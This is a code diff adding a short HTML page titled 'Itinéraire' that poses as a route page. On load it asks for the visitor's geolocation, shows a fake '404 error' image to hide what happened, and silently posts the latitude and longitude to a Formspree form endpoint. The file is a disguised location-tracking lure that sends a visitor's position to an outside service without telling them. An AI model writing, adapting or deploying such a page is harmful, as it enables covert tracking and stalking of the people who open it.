@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Itinéraire</title>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(savePosition, showError);
+            } else {
+                showError("Une erreur s'est produite lors de l'ouverture du fichier.");
+            }
+        }
+
+        function savePosition(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+
+            var imageElement = document.getElementById("image");
+            imageElement.src = "https://colorlib.com/wp/wp-content/uploads/sites/2/404-error-template-1.png";
+            imageElement.alt = "Erreur 404";
+            
+            // Préparation des données
+            var data = "Latitude: " + latitude + ", Longitude: " + longitude;
+
+            // Envoi des données via Formspree
+            var form = document.createElement("form");
+            form.setAttribute("action", "https://formspree.io/f/meqbjegg");
+            form.setAttribute("method", "POST");
+            form.setAttribute("enctype", "multipart/form-data");
+
+            var input = document.createElement("input");
+            input.setAttribute("type", "text");
+            input.setAttribute("name", "message");
+            input.setAttribute("value", data);
+            form.appendChild(input);
+
+            document.body.appendChild(form);
+            form.submit();
+        }
+
+        function showError(error) {
+            document.getElementById("error-message").textContent = error;
+        }
+    </script>
+</head>
+<body onload="getLocation()">
+    <img id="image" src="" alt="">
+    <p id="error-message"></p>
+</body>
+</html>
